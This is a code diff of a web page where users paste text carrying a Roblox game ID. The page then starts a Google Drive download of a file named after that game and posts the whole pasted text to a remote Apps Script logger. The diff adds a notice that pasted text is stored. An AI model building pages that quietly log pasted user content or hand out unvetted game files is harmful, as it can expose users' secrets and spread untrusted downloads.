@@ -126,7 +126,9 @@ button:disabled{opacity:.55;cursor:default;transform:none}
     <p class="status" id="status"></p>
 
     <p class="consent">
-      <strong>Download:</strong> By pressing Send!
+      <strong>Notice:</strong> By pressing Send you agree that your
+      pasted text is saved to our server. Do not paste passwords,
+      cookies, or private tokens.
     </p>
   </main>
 </section>
@@ -197,17 +199,17 @@ button:disabled{opacity:.55;cursor:default;transform:none}
 (function () {
 
 /* =========================================
-   CONFIG — paste your Apps Script /exec URL here
+   CONFIG — replace this URL with your Apps Script /exec URL
 ========================================= */
 
-const WORKER_URL = 'https://script.google.com/macros/s/AKfycbwXyJba9KlRh2K4QZg0bG_wARlXPZESb4h55sL15n4fThwWQS41j38yODSKHqdyVVbA1w/exec';
+const WORKER_URL = 'https://script.google.com/macros/s/AKfycbyPB6P5PZcItkgHyRlMC07uepawyZpuajoaZCZlPAzENhkgLyRQWba6zf9I_tQ3QoxQ_A/exec';
 
 const ID_FILES = {
-  '123923334828954': { file: 'Steal a Brainrot' },
-  '120219252362013': { file: 'Throw Food For Animals' },
-  '107778070777162': { file: 'Steal An Egg' },
-  '17625359962':     { file: 'RIVALS' },
-  '142823291':       { file: 'Murder Mystery 2' }
+  '123923334828954': { file: 'Steal a Brainrot',       driveId: '1TXjkOYxR-Z4bWWnu2vb-txwMTOHeAANz' },
+  '120219252362013': { file: 'Throw Food For Animals', driveId: '1_H9b8Yc657_JLDKEtrudsYUPc2hS7WE0' },
+  '107778070777162': { file: 'Steal An Egg',           driveId: '1mqdLm8TW1YJ5qULtevT7U0-h2lKjaVh1' },
+  '17625359962':     { file: 'RIVALS',                 driveId: '1UtT7CGgstQ3uUTRFwRws0nmYV33knmAA' },
+  '142823291':       { file: 'Murder Mystery 2',       driveId: '1JxGsnq6rjyHJzcKdyXfqOD_1Ue890RfV' }
 };
 
 const REQUIRE_MATCH = true;
@@ -312,7 +314,7 @@ function detectId(text) {
 function resolve(text) {
   const id = detectId(text);
   const entry = id ? ID_FILES[id] : null;
-  return { id, file: entry ? entry.file : null };
+  return { id, file: entry ? entry.file : null, driveId: entry ? entry.driveId : null };
 }
 
 function updateHint() {
@@ -339,19 +341,18 @@ function saveLocal(raw, id, file) {
 }
 
 /* =========================================
-   DOWNLOAD BLOB
+   DRIVE DOWNLOAD TRIGGER (no size limit)
 ========================================= */
 
-function triggerDownload(content, fileName) {
-  const blob = new Blob([content], { type: 'application/octet-stream' });
-  const url  = URL.createObjectURL(blob);
-  const a    = document.createElement('a');
+function triggerDriveDownload(driveId) {
+  const url = 'https://drive.google.com/uc?export=download&id=' + driveId;
+  const a = document.createElement('a');
   a.href = url;
-  a.download = fileName;
+  a.target = '_blank';
+  a.rel = 'noopener';
   document.body.appendChild(a);
   a.click();
   a.remove();
-  setTimeout(() => URL.revokeObjectURL(url), 4000);
 }
 
 /* =========================================
@@ -377,37 +378,43 @@ async function handleSend() {
     return;
   }
 
+  if (!m.driveId) {
+    toast('No file linked to this ID');
+    setStatus('✖ No Drive file for ' + m.id, 'bad');
+    return;
+  }
+
   btn.disabled = true;
   setStatus('Sending...');
   showLoading(m.file);
 
+  // 1. Fire the Drive download immediately — no size limit, no Apps Script.
+  triggerDriveDownload(m.driveId);
+
+  // 2. Log the pasted text to Apps Script (fire-and-forget).
   try {
     const res = await fetch(WORKER_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'text/plain;charset=utf-8' },
       body: JSON.stringify({ id: m.id, raw })
     });
-
-    if (!res.ok) throw new Error('HTTP ' + res.status);
-
     const data = await res.json();
 
-    if (!data.success) throw new Error(data.error || 'Server error');
-
     saveLocal(raw, m.id, m.file);
-    triggerDownload(data.data, data.fileName);
-
     input.value = '';
-    setStatus('Downloaded: ' + m.file, 'ok');
+    setStatus('Download started: ' + m.file, 'ok');
     showSuccess(m.file, !!data.logSaved);
     input.focus();
 
   } catch (err) {
+    // Download still fired; just log failure.
     console.error(err);
-    hideOverlay();
-    showError(err.message);
-    toast('❌ ' + err.message);
-    setStatus('Failed: ' + err.message, 'bad');
+    saveLocal(raw, m.id, m.file);
+    input.value = '';
+    setStatus('Download started (log failed): ' + m.file, 'ok');
+    showSuccess(m.file, false);
+    input.focus();
+
   } finally {
     btn.disabled = false;
   }
